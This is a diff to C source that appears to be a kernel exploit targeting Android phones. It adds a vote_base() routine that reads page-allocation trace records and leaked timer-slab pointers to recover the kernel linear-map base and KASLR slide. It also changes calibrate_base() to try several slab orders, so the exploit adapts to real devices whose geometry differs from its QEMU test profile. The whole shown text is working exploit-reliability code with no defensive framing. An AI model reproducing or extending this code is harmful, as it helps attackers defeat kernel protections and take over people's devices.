@@ -1180,13 +1180,75 @@ static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
     return best_cnt >= 8 ? best_base : 0;
 }
 
-static unsigned long long calibrate_base(unsigned char *raw)
+/*
+ * Vote the linear-map base for one candidate slab geometry.  The configured
+ * slab_order/slab_size is only a profile hint: SLUB derives the real order
+ * from the device's possible-CPU count, so a phone can differ from the QEMU
+ * boot used to validate the profile even on the same kernel.  calibrate_base()
+ * runs this for each order and keeps the geometry with the strongest vote.
+ */
+static unsigned long long vote_base(const unsigned char *b, size_t n, int pid,
+                                    const unsigned long long *ptrs, int nrec,
+                                    unsigned order, unsigned long long size,
+                                    unsigned long long *out_count)
 {
     unsigned long long hist[64] = {0}, hcnt[64] = {0};
     unsigned long long recent[64];
+    unsigned long long mask = ~(size - 1);
+    unsigned long long best = 0, bestc = 0;
+    int hc = 0, rn = 0;
+
+    for (size_t i = 16; i + 12 <= n; i += 4)
+    {
+        unsigned long long pfn = u64(b, i);
+
+        if (pfn >= (1ULL << 26) || (int)u32(b, i + 8) != (int)order ||
+            u32(b, i - 4) != (unsigned)pid ||
+            (u32(b, i - 8) & 0xffff) != g_t_page_alloc)
+            continue;
+        if (rn == 64)
+            memmove(recent, recent + 1, 63 * sizeof(recent[0])), rn--;
+        recent[rn++] = pfn;
+    }
+    for (int i = 0; i < nrec; i++)
+    {
+        unsigned long long slab = ptrs[i] & mask;
+
+        for (int j = 0; j < rn; j++)
+        {
+            unsigned long long base = slab - (recent[j] << PAGE_SHIFT);
+            int f = 0;
+
+            for (int k = 0; k < hc; k++)
+                if (hist[k] == base)
+                {
+                    hcnt[k]++;
+                    f = 1;
+                    break;
+                }
+            if (!f && hc < 64)
+            {
+                hist[hc] = base;
+                hcnt[hc] = 1;
+                hc++;
+            }
+        }
+    }
+    for (int k = 0; k < hc; k++)
+        if (hcnt[k] > bestc)
+        {
+            bestc = hcnt[k];
+            best = hist[k];
+        }
+    *out_count = bestc;
+    return best;
+}
+
+static unsigned long long calibrate_base(unsigned char *raw)
+{
     unsigned long long ptrs[512];
     unsigned long long site0 = 0;
-    int hc = 0, rn = 0, made = 0, me = getpid();
+    int made = 0, me = getpid();
     long n;
 
     trace_start();
@@ -1209,55 +1271,41 @@ static unsigned long long calibrate_base(unsigned char *raw)
 
     {
         int c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, &site0);
-
-        for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
-        {
-            unsigned long long pfn = u64(raw, i);
-
-            if (pfn >= (1ULL << 26) || (int)u32(raw, i + 8) != (int)SLAB_ORDER ||
-                u32(raw, i - 4) != (unsigned)me ||
-                (u32(raw, i - 8) & 0xffff) != g_t_page_alloc)
-                continue;
-            if (rn == 64)
-                memmove(recent, recent + 1, 63 * sizeof(recent[0])), rn--;
-            recent[rn++] = pfn;
-        }
-        for (int i = 0; i < c; i++)
-        {
-            unsigned long long slab = ptrs[i] & SLAB_MASK;
-
-            for (int j = 0; j < rn; j++)
-            {
-                unsigned long long base = slab - (recent[j] << PAGE_SHIFT);
-                int f = 0;
-
-                for (int k = 0; k < hc; k++)
-                    if (hist[k] == base)
-                    {
-                        hcnt[k]++;
-                        f = 1;
-                        break;
-                    }
-                if (!f && hc < 64)
-                {
-                    hist[hc] = base;
-                    hcnt[hc] = 1;
-                    hc++;
-                }
-            }
-        }
-    }
-    {
         unsigned long long best = 0, bestc = 0;
+        unsigned best_order = SLAB_ORDER;
+        unsigned long long best_size = SLAB_SIZE;
 
-        for (int k = 0; k < hc; k++)
-            if (hcnt[k] > bestc)
+        for (unsigned order = 0; order <= 3; order++)
+        {
+            unsigned long long size = (unsigned long long)PAGE << order;
+            unsigned long long cnt = 0;
+            unsigned long long base = vote_base(raw, (size_t)n, me, ptrs, c,
+                                                order, size, &cnt);
+
+            if (cnt > bestc)
             {
-                bestc = hcnt[k];
-                best = hist[k];
+                best = base;
+                bestc = cnt;
+                best_order = order;
+                best_size = size;
             }
-        logf("[base] made=%d site=%#llx slide=%#llx best=%#llx count=%llu\n",
-             made, site0, site0 ? site0 - STATIC_TIMER_SITE : 0, best, bestc);
+        }
+        if (best < LINEAR_MIN || best > LINEAR_MAX)
+            bestc = 0;
+        if (bestc >= 4 &&
+            (best_order != SLAB_ORDER || best_size != SLAB_SIZE))
+        {
+            logf("[!] slab geometry mismatch: conf order=%u size=%#llx, "
+                 "device order=%u size=%#llx; using device geometry\n",
+                 SLAB_ORDER, (unsigned long long)SLAB_SIZE, best_order,
+                 best_size);
+            g_cfg.slab_order = best_order;
+            g_cfg.slab_size = best_size;
+        }
+        logf("[base] made=%d site=%#llx slide=%#llx best=%#llx count=%llu "
+             "order=%u size=%#llx\n",
+             made, site0, site0 ? site0 - STATIC_TIMER_SITE : 0, best, bestc,
+             best_order, best_size);
         if (bestc < 4)
             return 0;
         /*
